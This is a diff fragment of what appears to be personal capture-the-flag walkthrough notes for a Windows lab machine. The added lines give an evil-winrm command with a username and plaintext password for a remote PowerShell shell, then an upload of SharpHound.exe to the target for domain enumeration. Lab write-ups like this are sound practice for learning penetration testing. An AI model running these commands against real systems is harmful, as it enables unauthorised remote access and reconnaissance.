@@ -77,8 +77,12 @@ Archive:  UserInfo.exe.zip
 
 #port 5985 is open so we can possibly get intrective shell we will tool :evil-winrm
 #Evil-WinRM is a post-exploitation tool used by attackers or penetration testers to get an interactive PowerShell shell on a remote Windows machine using WinRM (Windows Remote Management).
+evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
 
 
+#Download Sharphound.exe and save it in attack machine home
+#upload Sharphound on taget 
+upload /home/kali/SharpHound.exe #run this on target machine shell 
 
 
 
